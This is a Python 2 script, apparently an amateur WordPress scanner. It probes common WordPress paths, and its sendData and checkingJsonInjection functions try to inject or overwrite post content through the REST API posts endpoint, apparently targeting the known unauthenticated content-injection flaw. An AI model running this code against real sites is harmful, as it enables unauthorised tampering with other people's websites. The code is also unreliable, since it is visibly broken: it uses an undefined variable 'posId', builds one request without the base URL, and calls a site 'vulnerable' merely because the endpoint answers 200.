import requests
import urllib
import argparse
from threading import Thread
import json
import sys
import termcolor
from bs4 import BeautifulSoup

args = argparse.ArgumentParser()
args.add_argument('-u', '--url', type=str)
parser = args.parse_args()

class Wpscan():
	def __init__(self, url):

		self.headers = {'User-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1'}
		self.u = url
		self.uris = ['/wp-content', '/wp-json', '/wp-login','/wp-content/uploads/', '/wp-includes','/wp-content/uploads/themes','/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt','/wp-content/plugins/wp-responsive-thumbnail-slider/' ,'/wp-content/themes', '/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php', '/wp-json/wp/v2/posts']

		self.vuln = ['/wp-json/wp/v2/posts']


	def wpScan(self):
		
		req = requests.get(parser.url, headers=self.headers)
		soup = BeautifulSoup(req.text, 'lxml')
		metas = [meta for meta in soup.head.find_all('meta')]
		for x in metas:
			print x.attrs



	def vulnCheck(self):

		# Checking if the given website is vulnearble.

		try:
			req = requests.request('GET', self.u+self.vuln[0], headers=self.headers)
			if req.status_code == 200:
				print '\n[+Vulnearable+] {0} '.format(self.u+self.vuln[0])
			else:
				print '\n[N] {0} not vulnerable'.format(self.u+self.vuln[0])
		except Exception as e:
			return e
	
	def dirAvail(self):
		#Checking  which dirs are available or have access.
		for uri in self.uris:
			try:
				req = requests.request('GET', self.u+uri, headers=self.headers)
				if req.status_code == 200:
					print '\n[+EXISTS+] {0} '.format(self.u+uri)
				else:
					print '\n[+CODE {}+]{}'.format(req.status_code, self.u+uri)
			except Exception as e:
				return e

	def getData(self):
		try:
			req = requests.request('GET', self.u+self.uris[1])
			jsonData = req.text
			parse = json.dumps(str(jsonData))
		except Exception as e:
			return e

	def sendData(self):

		# Uploading data to the specified post. 

		try:	
			self.posId = raw_input('Post id: ')
			data_to_send = {'adsfa':'adsfs','title':'yo lickk'}
			header = {'Content-Type':'application/json'}
			do_post = self.u+self.vuln[0]+'/'+posId
			
			paylod = '/?id='+posId
			print '\n----------------------------------------------------------'
			print 'URL ==> {0}'.format(do_post)
			print 'DATA ==> {0}'.format(json.dumps(data_to_send))
			print 'Header ==> {0}'.format(header)
			print '------------------------------------------------------------'	
			req = requests.request('POST', do_post , data=json.dumps(data_to_send), headers=header)
		
#s			req = requests.request('PUT', do_post , data=json.dumps(data_to_send), headers=header)


			print '\n'+str(req.text)
			return '\nStatus Code {0}'.format(req.status_code)
		except Exception as e:
			print '{0} Error occured...'.format(req.status_code)
			return e

	def checkingJsonInjection(self):


		# This if for checking Whether the json Data can be injected in the webiste or not.


		try:
			req = requests.request('Post', self.vuln[0]+'/?id='+self.posId+'ABC')
			print '\nStatus Code ==> {0}'.format(req.status_code)
			print ''+str(req.text)

		except Exception as e:
			return str(e)





	def start(self):
		self.wpScan()
		# self.vulnCheck()
		# self.dirAvail()

if __name__ == '__main__':
	wpscan = Wpscan(parser.url)
	print ''
	print '==================== RESULT ================================'
	wpscan.start()
	print '====================== END =================================='



